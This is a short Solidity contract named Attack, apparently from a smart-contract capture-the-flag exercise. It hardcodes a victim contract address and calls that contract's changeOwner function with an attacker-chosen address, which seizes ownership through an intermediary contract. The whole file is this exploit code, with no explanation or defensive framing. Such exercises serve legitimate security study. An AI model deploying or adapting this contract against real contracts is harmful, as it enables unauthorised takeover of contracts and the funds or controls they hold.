// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    
    address public victim = 0xBcd84084D01573516A55447D4e3a82Ffcd894B17;
    
    function attack(address _owner) external {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", _owner);
        victim.call(payload);
    }
}